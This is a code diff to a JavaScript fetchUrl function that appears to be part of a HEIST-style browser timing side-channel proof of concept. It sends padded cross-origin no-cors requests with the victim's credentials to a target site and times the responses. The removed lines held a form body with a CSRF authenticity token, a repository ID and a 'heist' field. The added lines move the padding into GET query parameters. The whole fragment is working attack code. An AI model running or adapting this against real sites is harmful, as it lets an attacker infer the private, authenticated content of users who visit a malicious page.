@@ -14,7 +14,7 @@ function fetchUrl(site, payloadSize) {
   console.log('Payload size: '+ payloadSize);
   var payload = generatePayload(payloadSize);
 
-  site += '?'+payload;
+  site += '?a='+payload+'&b='+generatePayload(8000);
 
   console.log('setting interval');
   interval = setInterval(function(){
@@ -29,12 +29,11 @@ function fetchUrl(site, payloadSize) {
   });
 
   fetch(site, {
-    method: 'post',
+    method: 'get',
     mode: 'no-cors',
     redirect: 'manual',
     cache: 'no-cache',
     credentials: 'include',
-    body : 'utf8=%E2%9C%93&authenticity_token=6nletYfGcKgnquE9UnR9IDGq13WZb7WgAQ8XoltMyXLrcoMUdYYfopfSKtTdKT87WHzu%2BrwUEThgqFbXCjBD8A%3D%3D&repository_id=64934908&do=included&heist='+generatePayload(8000)
   })
   .then(function(result){
     T1 = performance.now();
